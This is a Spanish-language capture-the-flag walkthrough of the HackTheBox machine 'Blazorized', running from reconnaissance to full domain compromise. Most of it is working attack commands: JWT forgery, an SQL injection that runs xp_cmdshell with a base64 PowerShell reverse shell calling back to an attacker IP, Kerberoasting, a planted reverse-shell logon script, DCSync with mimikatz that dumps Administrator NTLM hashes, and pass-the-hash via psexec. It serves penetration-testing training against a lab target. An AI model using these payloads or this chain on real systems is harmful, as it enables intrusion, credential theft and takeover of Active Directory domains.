![](https://404zzero.github.io/zzero.github.io//assets/images/Blazorized/Blazorized-card.png)
---

**Blazorized** es una máquina de dificultad difícil en la plataforma HackTheBox. La máquina en cuestión está ejecutando un servidor web. Al inspeccionar su código fuente, conseguimos encontrar y extraer varios archivos `.dll`. Tras realizar ingeniería inversa sobre estos archivos, logramos descubrir la firma que nos permite generar un **JSON Web Token (JWT)**, lo que nos da acceso a un panel de administración. Este panel tiene una vulnerabilidad de **SQL Injection**, que nos permite ejecutar comandos y obtener acceso inicial a la máquina.

Una vez dentro de la máquina, identificamos una cuenta de usuario **kerberosteable**, de la cual extraemos el hash, lo crackeamos y obtenemos la contraseña. Este usuario tiene permisos para ejecutar archivos en un directorio que maneja scripts `.bat`, lo que nos permite inyectar un script malicioso y obtener acceso como un nuevo usuario.

Con este nuevo usuario, realizamos un ataque **DCSync** para extraer el hash NTLM de la cuenta **Administrator**, obteniendo así control total sobre la máquina víctima.

---

lo primero como siempre el escaneo de nmap:
```bash
nmap -p- --open --min-rate 500 -sT -vvv -n -Pn 10.10.11.22 -oG allports
```

![](https://404zzero.github.io/zzero.github.io//assets/images/Blazorized/Pasted-image-20241112122841.png)

```bash
nmap -sVC -p53,80,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389,47001,49664,49665,49666,49667,49672,49674,49675,49678,49683,49705,49763,49776 10.10.11.22 -oN ports

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-12 12:29 CET
Nmap scan report for 10.10.11.22
Host is up (0.081s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: Did not follow redirect to http://blazorized.htb
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-11-12 12:29:27Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: blazorized.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2022 16.00.1115.00; RC0+
| ms-sql-ntlm-info: 
|   10.10.11.22\BLAZORIZED: 
|     Target_Name: BLAZORIZED
|     NetBIOS_Domain_Name: BLAZORIZED
|     NetBIOS_Computer_Name: DC1
|     DNS_Domain_Name: blazorized.htb
|     DNS_Computer_Name: DC1.blazorized.htb
|     DNS_Tree_Name: blazorized.htb
|_    Product_Version: 10.0.17763
| ms-sql-info: 
|   10.10.11.22\BLAZORIZED: 
|     Instance name: BLAZORIZED
|     Version: 
|       name: Microsoft SQL Server 2022 RC0+
|       number: 16.00.1115.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RC0
|       Post-SP patches applied: true
|     TCP port: 1433
|_    Clustered: false
|_ssl-date: 2024-11-12T12:30:31+00:00; +1h00m01s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2024-11-12T04:02:04
|_Not valid after:  2054-11-12T04:02:04
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: blazorized.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  msrpc         Microsoft Windows RPC
49683/tcp open  msrpc         Microsoft Windows RPC
49705/tcp open  msrpc         Microsoft Windows RPC
49763/tcp open  msrpc         Microsoft Windows RPC
49776/tcp open  ms-sql-s      Microsoft SQL Server 2022 16.00.1115.00; RC0+
| ms-sql-info: 
|   10.10.11.22:49776: 
|     Version: 
|       name: Microsoft SQL Server 2022 RC0+
|       number: 16.00.1115.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RC0
|       Post-SP patches applied: true
|_    TCP port: 49776
| ms-sql-ntlm-info: 
|   10.10.11.22:49776: 
|     Target_Name: BLAZORIZED
|     NetBIOS_Domain_Name: BLAZORIZED
|     NetBIOS_Computer_Name: DC1
|     DNS_Domain_Name: blazorized.htb
|     DNS_Computer_Name: DC1.blazorized.htb
|     DNS_Tree_Name: blazorized.htb
|_    Product_Version: 10.0.17763
|_ssl-date: 2024-11-12T12:30:31+00:00; +1h00m01s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2024-11-12T04:02:04
|_Not valid after:  2054-11-12T04:02:04
Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h00m01s, deviation: 0s, median: 1h00m00s
| smb2-time: 
|   date: 2024-11-12T12:30:23
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 86.26 seconds
```

hay mojollon de puertos abiertos por lo que se ve de lejos que es un active directory

si vemos mejor el puerto 80 vemos un dominio 
por lo que vamos a añadirlo al etc/hosts

![](https://404zzero.github.io/zzero.github.io//assets/images/Blazorized/Pasted-image-20241112123752.png)
ejecutamos un whatweb al dominio para ver un poco lo que hay

![](https://404zzero.github.io/zzero.github.io//assets/images/Blazorized/Pasted-image-20241112123859.png)

no vemos nada interesante asique bueno 

vamos a ver que hay en la web
http://blazorized.htb/

al entrar vemos lo siguiente 

![](https://404zzero.github.io/zzero.github.io//assets/images/Blazorized/Pasted-image-20241112124021.png)

si nos ponemos a mirar la web pone en todos lados que hay fallos por una api no encontrada.

lo unico que ve o que tiene algo es el apartado de updates

![](https://404zzero.github.io/zzero.github.io//assets/images/Blazorized/Pasted-image-20241112124555.png)
si le damos a chek for updates nos sale un error 
parece que todo tiene que ver con una api

vamos a ver a donde hace las solicitudes al hacer click a chek for updates

![](https://404zzero.github.io/zzero.github.io//assets/images/Blazorized/Pasted-image-20241112124820.png)
![](https://404zzero.github.io/zzero.github.io//assets/images/Blazorized/Pasted-image-20241112124838.png)

vemos un nuevo dominio 
por lo que vamos a añadirlo al etc/hosts

![](https://404zzero.github.io/zzero.github.io//assets/images/Blazorized/Pasted-image-20241112125022.png)

provamos a hacer un ping a ver si ya estas

![](https://404zzero.github.io/zzero.github.io//assets/images/Blazorized/Pasted-image-20241112125130.png)
vemos que si por lo que voy a probar a darle otra vez al boton de updates
![](https://404zzero.github.io/zzero.github.io//assets/images/Blazorized/Pasted-image-20241112181824.png)
ya que emos encontrado el subdominio api me da curiosidad si hay mas por lo que vamos a tirar de gobuster para ver si hay mas

```bash
gobuster vhost -u http://blazorized.htb -w /usr/share/seclists/Discovery/DNS/* --append-domain -t 200
```

![](https://404zzero.github.io/zzero.github.io//assets/images/Blazorized/Pasted-image-20241112183014.png)
encontramos un subdominio admin por lo que lo añadimos al etc/hosts

vamos tambie a enmuerar usuarios ya de paso con netexec:
```bash
netexec smb blazorized.htb
```
![](https://404zzero.github.io/zzero.github.io//assets/images/Blazorized/Pasted-image-20241112184353.png)
vemos un DC1 por lo que lo añadimos tambien al etc/hosts

si vamos al http://admin.blazorized.htb veremos lo siguiente:
![](https://404zzero.github.io/zzero.github.io//assets/images/Blazorized/Pasted-image-20241112184943.png)
vale un panel de login

vamos a salirnos de aqui un rato y vamos a volver a http://blazorized.htb/check-updates
vamos a interceptar con burpsuite la peticion de cuando le damos a hacer la update
![](https://404zzero.github.io/zzero.github.io//assets/images/Blazorized/Pasted-image-20241112185632.png)
si le damos a forward 4 veces veremos el proceso de peticiones.
nos pasamos al repiter las 2 y la 4
![](https://404zzero.github.io/zzero.github.io//assets/images/Blazorized/Pasted-image-20241112190052.png)
si le damos a send a la 2 pues nos sale todos los datos de los post que nos añade al hacer la actualizacion 
y la 4 las tablas 

lo importante de aqui no es eso, es que tienen json web token que podemos intentar descifrar para conseguirn info 

primero vamos a hacerlo con el de la 4 y vamos a usar primero flask-unsign

```bash
flask-unsign -d -c 'eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9lbWFpbGFkZHJlc3MiOiJzdXBlcmFkbWluQGJsYXpvcml6ZWQuaHRiIiwiaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93cy8yMDA4LzA2L2lkZW50aXR5L2NsYWltcy9yb2xlIjpbIlBvc3RzX0dldF9BbGwiLCJDYXRlZ29yaWVzX0dldF9BbGwiXSwiZXhwIjoxNzMxNDM0NDM2LCJpc3MiOiJodHRwOi8vYXBpLmJsYXpvcml6ZWQuaHRiIiwiYXVkIjoiaHR0cDovL2FwaS5ibGF6b3JpemVkLmh0YiJ9.eObsCLBQCB67MVZ_2IkB2wJZphC7uWLRsS7hn7G0VmMowOy46Z6pEwi-svyNaHVT1oHzyzJA1eJbzGAuphFn5w'
```

![](https://404zzero.github.io/zzero.github.io//assets/images/Blazorized/Pasted-image-20241112191108.png)
vemos que nos da el algoridmo y poco mas
pero si desciframos en base64 el paiload del token vemos algo mas util

```bash
 echo 'eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9lbWFpbGFkZHJlc3MiOiJzdXBlcmFkbWluQGJsYXpvcml6ZWQuaHRiIiwiaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93cy8yMDA4LzA2L2lkZW50aXR5L2NsYWltcy9yb2xlIjpbIlBvc3RzX0dldF9BbGwiLCJDYXRlZ29yaWVzX0dldF9BbGwiXSwiZXhwIjoxNzMxNDM0NDM2LCJpc3MiOiJodHRwOi8vYXBpLmJsYXpvcml6ZWQuaHRiIiwiYXVkIjoiaHR0cDovL2FwaS5ibGF6b3JpemVkLmh0YiJ9' | base64 -d | jq
```
![](https://404zzero.github.io/zzero.github.io//assets/images/Blazorized/Pasted-image-20241112191332.png)
tenemos un correo
si con burpsuite nos ponemos a ver el historial de consultas desde la raiz del dominio base vemos muchas consulatas a archivos .dll
![](https://404zzero.github.io/zzero.github.io//assets/images/Blazorized/Pasted-image-20241113181645.png)
si pillamos uno ( yo e pillado el que se llama helper) y lo pasamos por un programa llamado AvaloniaILSpy

![](https://404zzero.github.io/zzero.github.io//assets/images/Blazorized/Pasted-image-20241113183221.png)
si nos metemos en el apartado JWT (jason web token) vemso algo muy critico
![](https://404zzero.github.io/zzero.github.io//assets/images/Blazorized/Pasted-image-20241113183326.png)
por lo que podemos crear nustro propio jwt
vamos a hacerlo con el interprete de python3

![](https://404zzero.github.io/zzero.github.io//assets/images/Blazorized/Pasted-image-20241113184752.png)
![](https://404zzero.github.io/zzero.github.io//assets/images/Blazorized/Pasted-image-20241113184909.png)
perfecto tenemos jwt
por lo que si nos vamos al panel de logueo y en el inspector de tareas en la parte de almacenamiento local lo pegamos

![](https://404zzero.github.io/zzero.github.io//assets/images/Blazorized/Pasted-image-20241113185336.png)
y recargamos la pagina
![](https://404zzero.github.io/zzero.github.io//assets/images/Blazorized/Pasted-image-20241113185442.png)
acceso
tonteando un rato por aqui e descubierto una posible SQLI en el panel de chekear duplicados:

![](https://404zzero.github.io/zzero.github.io//assets/images/Blazorized/Pasted-image-20241113190448.png)
no esta dando un resultado exitoso (asta donde se en los post no hay referencias a Neo genesis evangelion asique xdd) por lo que esta haciendo la injecion

por lo que vamos a intentar mandarnos la tipica revershell https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1

![](https://404zzero.github.io/zzero.github.io//assets/images/Blazorized/Pasted-image-20241113191252.png)
una vez echo lo ponemos utf-16le y en base64:
```bash
cat rev.ps1 | iconv -t utf-16le | base64 -w 0; echo
```
![](https://404zzero.github.io/zzero.github.io//assets/images/Blazorized/Pasted-image-20241113191831.png)
y vamos a usar la siguiente injecion para acceder:
```bash
eva013'; EXEC xp_cmdshell 'powershell -e CgAkAGMAbABpAGUAbgB0ACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBvAGMAawBlAHQAcwAuAFQAQwBQAEMAbABpAGUAbgB0ACgAJwAxADAALgAxADAALgAxADYALgA4ADkAJwAsADQANAA0ADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAJwBQAFMAIAAnACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAJwA+ACAAJwA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQAKAAoACgA=' -- -
```

nos ponemos en escucha por el puerto 4444
```bash
rlwrap -cAr nc -nlvp 4444
```

![](https://404zzero.github.io/zzero.github.io//assets/images/Blazorized/Pasted-image-20241113192344.png)
y bump estamos dentro

si nos vamos a la carpeta de Users vemos mas usuarios
![](https://404zzero.github.io/zzero.github.io//assets/images/Blazorized/Pasted-image-20241113192709.png)
vamos a intentar hacer el reconocimiento mediante sharphound.exe y blodhount

vamos a usar un server python3 y wget pra esto:

```bash
 wget "http://10.10.16.89:8000/SharpHound.exe" -OutFile .\SharpHound.exe
```

![](https://404zzero.github.io/zzero.github.io//assets/images/Blazorized/Pasted-image-20241113194702.png)

y lo ejecutamos de esta manera:
```cmd
.\SharpHound.exe -c ALL
```
![](https://404zzero.github.io/zzero.github.io//assets/images/Blazorized/Pasted-image-20241113194918.png)
nos crea un .zip que tenemos que pasarnos

para pasarnoslo vamos a usar impacket y smb de esta forma en la maquina atacante:

```bash
impacket-smbserver pepe $(pwd) -username zzero -password zzero -smb2support
```

![](https://404zzero.github.io/zzero.github.io//assets/images/Blazorized/Pasted-image-20241113195451.png)
y para pasarlo seria

```cmd
net use \\10.10.16.89\pepe /u:zzero zzero
copy 20241113124846_BloodHound.zip \\10.10.16.89\smbfolder\blod.zip
```

una vez copiado lo pasamos al blodhunt

![](https://404zzero.github.io/zzero.github.io//assets/images/Blazorized/Pasted-image-20241113200203.png)
![](https://404zzero.github.io/zzero.github.io//assets/images/Blazorized/Pasted-image-20241113201322.png)
(e tenido que ir a la version de docker por unos fallos)
sui le damos a outbound object control vemos que tenemos control de un usuario

![](https://404zzero.github.io/zzero.github.io//assets/images/Blazorized/Pasted-image-20241113201722.png)

y si vemos la info de el abuso 
![](https://404zzero.github.io/zzero.github.io//assets/images/Blazorized/Pasted-image-20241113201631.png)
nos dice que podemos usar keberos para un tiket 
para ello vamos a usar powerview como bien dice el bloodhound

para ello como en el caso de sharphound, server python y wget:
```cmd
wget "http://10.10.16.89:8000/powerview.ps1 " -OutFile .\powerview.ps1 
```

y ponemos los siguientes comando:

```bash
Import-Module .\powerview.ps1 
Set-DomainObject -Identity rsa_4810 -SET @{serviceprincipalname='none xistent/BLAHBLAH'}
Get-DomainUser rsa_4810 | Get-DomainSPNTicket
```
y nos va a solatar esto
![](https://404zzero.github.io/zzero.github.io//assets/images/Blazorized/Pasted-image-20241113203541.png)
que lo podemos crakear 
y nos da esta contraseña

![](https://404zzero.github.io/zzero.github.io//assets/images/Blazorized/Pasted-image-20241113203619.png)
lo probamos con netexect para ver si esta bien:
```bash
netexec smb blazorized.htb -u 'RSA_4810' -p '(Ni7856009854Ki05Ng0005 #)'
```
![](https://404zzero.github.io/zzero.github.io//assets/images/Blazorized/Pasted-image-20241113205400.png)
(NOTA: sale que esta mal pero esta bien. estuve en los foros de la maquina mirando y no soy al unico que le pasa)

y ahora con evil-winrm nos conectamos:
```bash
evil-winrm -i blazorized.htb -u 'rsa_4810' -p '(Ni7856Do9854Ki05Ng0005 #)'
```

![](https://404zzero.github.io/zzero.github.io//assets/images/Blazorized/Pasted-image-20241113205522.png)
ahora vamos al directorio C:\Windows\sysvol\sysvol\blazorized.htb\scripts
![](https://404zzero.github.io/zzero.github.io//assets/images/Blazorized/Pasted-image-20241113205936.png)
y investigando un poco en el directorio A32FF3AEAA23 vemos un .bat
![](https://404zzero.github.io/zzero.github.io//assets/images/Blazorized/Pasted-image-20241113210024.png)

hay un suario SSA_6010 que se esta conectando a este directorio casi constantemente

![](https://404zzero.github.io/zzero.github.io//assets/images/Blazorized/Pasted-image-20241113210224.png)
por lo que podemos intentar hacer una revershell para haceder al suario mediante que modifiquemos sus atrivutos en el entorno AD

```bash
'powershell -e cG93ZXJzaGVsbCAtbm9wIC1XIGhpZGRlbiAtbm9uaSAtZXAgYnlwYXNzIC1jICIkVENQQ2xpZW50ID0gTmV3LU9iamVjdCBOZXQuU29ja2V0cy5UQ1BDbGllbnQoJzEwLjEwLjE2Ljg5JywgNDQ0NCk7JE5ldHdvcmtTdHJlYW0gPSAkVENQQ2xpZW50LkdldFN0cmVhbSgpOyRTdHJlYW1Xcml0ZXIgPSBOZXctT2JqZWN0IElPLlN0cmVhbVdyaXRlcigkTmV0d29ya1N0cmVhbSk7ZnVuY3Rpb24gV3JpdGVUb1N0cmVhbSAoJFN0cmluZykge1tieXRlW11dJHNjcmlwdDpCdWZmZXIgPSAwLi4kVENQQ2xpZW50LlJlY2VpdmVCdWZmZXJTaXplIHwgJSB7MH07JFN0cmVhbVdyaXRlci5Xcml0ZSgkU3RyaW5nICsgJ1NIRUxMPiAnKTskU3RyZWFtV3JpdGVyLkZsdXNoKCl9V3JpdGVUb1N0cmVhbSAnJzt3aGlsZSgoJEJ5dGVzUmVhZCA9ICROZXR3b3JrU3RyZWFtLlJlYWQoJEJ1ZmZlciwgMCwgJEJ1ZmZlci5MZW5ndGgpKSAtZ3QgMCkgeyRDb21tYW5kID0gKFt0ZXh0LmVuY29kaW5nXTo6VVRGOCkuR2V0U3RyaW5nKCRCdWZmZXIsIDAsICRCeXRlc1JlYWQgLSAxKTskT3V0cHV0ID0gdHJ5IHtJbnZva2UtRXhwcmVzc2lvbiAkQ29tbWFuZCAyPiYxIHwgT3V0LVN0cmluZ30gY2F0Y2ggeyRfIHwgT3V0LVN0cmluZ31Xcml0ZVRvU3RyZWFtICgkT3V0cHV0KX0kU3RyZWFtV3JpdGVyLkNsb3NlKCki' | Out-File -FilePath C:\Windows\sysvol\sysvol\blazorized.htb\scripts\A32FF3AEAA23\exploit.bat -Encoding ASCII
```
una vez creado el exploit modificamos sus atrivutos

```bash

Set-ADUser -Identity SSA_6010 -ScriptPath 'C:\Windows\sysvol\sysvol\blazorized.htb\scripts\A32FF3AEAA23\exploit.bat'
```

echo esto nos ponemos en escucha por el puerto 4444
```bash
rlwrap -cAr nc -lvnp 4444

listening on [any] 443 ...
connect to [10.10.16.3] from (UNKNOWN) [10.10.11.22] 61491
whoami

blazorized\ssa_6010
PS C:\Windows\system32>
```

una vez dentro exportamos powerviu y vemso a que grupo pertenece 

```cmd
Get-DomainUser -Identity SSA_6010  |select samaccountname,objectsid,memberof,useraccountcontrol |fl
```

Podemos revisar si este usuario puede performar una ataque `DCSync`. Para ello podemos extraer el `SID` de `ssa_6010` (el cual se muestra en el output del comando `Get-NetUser` ejecutado anteriormente) y ejecutar en la terminal de `RSA_4810`

```cmd
*Evil-WinRM* PS C:\Windows\sysvol\sysvol\blazorized.htb\scripts> $sid = 'S-1-5-21-2039403211-964143010-2924010611-1124'

*Evil-WinRM* PS C:\Windows\sysvol\sysvol\blazorized.htb\scripts> Get-ObjectAcl "DC=blazorized,DC=htb" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')}


AceQualifier           : AccessAllowed
ObjectDN               : DC=blazorized,DC=htb
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : DS-Replication-Get-Changes
ObjectSID              : S-1-5-21-2039403211-964143010-2924010611
InheritanceFlags       : None
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-2039403211-964143010-2924010611-498
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : DC=blazorized,DC=htb
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : DS-Replication-Get-Changes-All
ObjectSID              : S-1-5-21-2039403211-964143010-2924010611
InheritanceFlags       : None
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-2039403211-964143010-2924010611-516
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0
```

y tenemos via libre

por lo que con tansolo mimikat :

```cmd
.\mimikatz.exe

.\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # lsadump::dcsync /domain:blazorized.htb /user:Administrator

[DC] 'blazorized.htb' will be the domain
[DC] 'DC1.blazorized.htb' will be the DC server
[DC] 'Administrator' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : Administrator

** SAM ACCOUNT **

SAM Username         : Administrator
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   :
Password last change : 2/25/2024 12:54:43 PM
Object Security ID   : S-1-5-21-2039403211-964143010-2924010611-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: f55ed1465179ba374ec1cad05b34a5f3
    ntlm- 0: f55ed1465179ba374ec1cad05b34a5f3
    ntlm- 1: eecc741ecf81836dcd6128f5c93313f2
    ntlm- 2: c543bf260df887c25dd5fbacff7dcfb3
    ntlm- 3: c6e7b0a59bf74718bce79c23708a24ff
    ntlm- 4: fe57c7727f7c2549dd886159dff0d88a
    ntlm- 5: b471c416c10615448c82a2cbb731efcb
    ntlm- 6: b471c416c10615448c82a2cbb731efcb
    ntlm- 7: aec132eaeee536a173e40572e8aad961
    ntlm- 8: f83afb01d9b44ab9842d9c70d8d2440a
    ntlm- 9: bdaffbfe64f1fc646a3353be1c2c3c99
    lm  - 0: ad37753b9f78b6b98ec3bb65e5995c73
    lm  - 1: c449777ea9b0cd7e6b96dd8c780c98f0
    lm  - 2: ebbe34c80ab8762fa51e04bc1cd0e426
    lm  - 3: 471ac07583666ccff8700529021e4c9f
    lm  - 4: ab4d5d93532cf6ad37a3f0247db1162f
    lm  - 5: ece3bdafb6211176312c1db3d723ede8
    lm  - 6: 1ccc6a1cd3c3e26da901a8946e79a3a5
    lm  - 7: 8b3c1950099a9d59693858c00f43edaf
    lm  - 8: a14ac624559928405ef99077ecb497ba
```

tenemos el hash

lo comprobamos 

```bash

netexec winrm 10.10.11.22 -u 'Administrator' -H 'f55ed1465179ba374ec1cad05b34a5f3'


WINRM       10.10.11.22     5985   DC1              [*] Windows 10 / Server 2019 Build 17763 (name:DC1) (domain:blazorized.htb)
WINRM       10.10.11.22     5985   DC1              [+] blazorized.htb\Administrator:f55ed1465179ba374ec1cad05b34a5f3 (Pwn3d!)

```

tnemos acceso

y para variar vamos a hacer un pass the hash para haceder

```bash
python3 /usr/share/doc/python3-impacket/examples/psexec.py -hashes ad37753b9f78b6b98ec3bb65e5995c73:f55ed1465179ba374ec1cad05b34a5f3 Administrator@blazorized.htb cmd.exe

Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Requesting shares on blazorized.htb.....
[*] Found writable share ADMIN$
[*] Uploading file XphekYjf.exe
[*] Opening SVCManager on blazorized.htb.....
[*] Creating service DUqR on blazorized.htb.....
[*] Starting service DUqR.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.5933]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami

nt authority\system
```
